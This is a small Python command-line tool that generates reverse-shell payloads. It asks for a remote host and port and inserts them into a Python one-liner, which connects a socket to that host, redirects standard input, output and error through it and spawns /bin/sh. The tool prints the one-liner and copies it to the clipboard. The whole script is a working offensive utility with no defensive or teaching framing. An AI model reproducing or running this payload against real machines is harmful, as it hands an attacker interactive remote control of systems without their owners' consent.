#!/usr/bin/env python3
import pyperclip as clip
import os

def menu():
    print('''
    ________MENU_________
    \n1. Python \n2. WIP
          ''')

def pymenu():
    print('''
    ________MENU_________
    \n1. Python2.7 \n2. WIP\n3. Back to Main Menu
          ''')

def pysubprocess():
    selectShell = int(input("Select Library:"))
    if selectShell == 1:
        rhost = input("RHOST= ")
        port = input("PORT= ")
        shell ="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""".format(rhost, port)
        print(shell)
        clip.copy(shell)
        print("\n Copied to Clipboard!")
    elif selectShell == 3:
        main()
    else:
        os.system("clear")
        pymenu()
        pysubprocess()

def main():
    os.system("clear")
    menu()
    selectLib = int(input("Select Library:"))
    
    if selectLib == 1:
        os.system("clear")
        pymenu()
        pysubprocess()
    else:
        main()

if __name__ == "__main__":
    main()
